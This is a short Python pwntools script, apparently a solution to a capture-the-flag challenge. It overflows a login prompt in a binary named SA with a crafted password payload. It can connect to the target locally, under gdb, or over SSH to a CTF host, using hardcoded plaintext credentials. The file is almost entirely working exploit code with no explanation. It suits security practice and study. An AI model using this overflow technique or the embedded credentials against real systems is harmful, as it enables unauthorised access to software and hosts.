#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./SA"

rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='i386')
binf = ELF(FILENAME)

def exploit(conn):
  print("[+]waiting for UNAME...")
  print(conn.recvuntil("UNAME:"))
  conn.sendline("A"*3)
  print("[+]waiting for PASSWd...")
  print(conn.recvuntil("PASSWD: "))
  #raw_input()
  conn.sendline("A"*8+'\x00'+"A"*0x90)
  #conn.sendline("A"*8)

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    #conn = remote(rhp1["host"],rhp1["port"])
    s = ssh(host="ctf2.kaf.sh",port=7020,user="yeet",password="12345678")
    print("[+]ssh connected")
    conn = s.run("./SA")
    print("[+]processed")
    #conn = s.connect_remote(s.host,7020)
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

